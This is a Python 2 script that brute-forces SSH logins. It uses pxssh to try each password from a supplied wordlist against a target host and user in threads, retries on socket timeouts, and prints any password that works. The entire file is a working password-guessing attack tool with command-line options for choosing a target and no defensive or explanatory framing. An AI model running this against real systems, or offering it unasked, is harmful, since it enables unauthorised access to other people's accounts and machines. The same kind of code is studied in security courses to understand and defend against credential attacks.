import pxssh
import optparse
import time
from threading import *
# Set maxconnections of threads
maxConnections = 1
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host, user, password, release):
    # User the global variables
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        #  Try login with user/password
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(1)
            # Try again
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            # Try again
            connect(host, user, password, False)
    finally:
        # If get a wrong-pass answer, then release a thread-lock
        if release:
            connection_lock.release()
def main():
    parser = optparse.OptionParser("usage%prog -H <target host> -u <user> -F <password list>")
    parser.add_option('-H', dest='TgHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    (options, args) = parser.parse_args()
    host = options.TgHost
    user = options.user
    passwdFile = options.passwdFile
    if (host == None) | (user == None) | (passwdFile == None):
        print parser.usage
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
	if Found:
            # If passwdFile enum ends before a thread found the passwd, 'Exiting...' will not be able to echo on the screen
            print "[*] Exiting: Password  Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: " + str(password)
        t = Thread(target = connect, args = (host, user, password, True))
        child = t.start()
if __name__ == '__main__':
    main()